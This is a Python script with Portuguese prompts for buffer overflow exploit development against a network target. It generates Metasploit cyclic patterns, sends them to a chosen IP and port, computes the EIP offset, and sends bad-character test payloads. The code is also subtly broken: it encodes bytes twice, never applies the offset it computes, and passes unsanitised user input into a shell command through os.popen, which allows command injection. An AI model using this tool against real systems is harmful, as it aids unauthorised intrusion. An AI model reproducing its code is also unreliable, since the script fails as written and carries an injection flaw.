import socket
import os

def send_payload(target_ip, target_port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((target_ip, target_port))
        sock.send(payload.encode())
        response = sock.recv(1024)
        print(response.decode())
    except Exception as e:
        print(f"Não foi possível conectar-se ao alvo: {target_ip}:{target_port}")
        print(f"Mensagem de erro: {str(e)}")
        print(f"Valor do padrão gerado: {payload}")

    sock.close()

def create_pattern_menu():
    pattern_length = int(input("Informe o tamanho do padrão: "))

    # Comando para criar o padrão com o pattern_create
    create_pattern_cmd = f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {pattern_length}"
    pattern = os.popen(create_pattern_cmd).read().strip()

    target_ip = input("Informe o endereço IP do alvo: ")
    target_port = int(input("Informe a porta do alvo: "))

    send_payload(target_ip, target_port, pattern.encode())

def determine_offset_menu():
    pattern = input("Informe o padrão enviado anteriormente: ")
    eip_value = input("Informe o valor do EIP encontrado na aplicação: ")

    # Comando para determinar o offset com o pattern_offset
    determine_offset_cmd = f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {eip_value}"
    offset = os.popen(determine_offset_cmd).read().strip()

    print(f"Offset encontrado: {offset}")

    target_ip = input("Informe o endereço IP do alvo: ")
    target_port = int(input("Informe a porta do alvo: "))

    # Valor fixo "BBBB"
    payload = "BBBB"

    badchars = input("Informe os badchars a serem enviados: ")
    payload += badchars

    send_payload(target_ip, target_port, payload.encode())

def main_menu():
    while True:
        print("\n-- Menu --")
        print("1. Criar padrão e enviar para o alvo")
        print("2. Determinar offset e enviar badchars")
        print("3. Sair")

        choice = input("Escolha uma opção: ")
        if choice == "1":
            create_pattern_menu()
        elif choice == "2":
            determine_offset_menu()
        elif choice == "3":
            break
        else:
            print("Opção inválida!")

def main():
    main_menu()

if __name__ == "__main__":
    main()
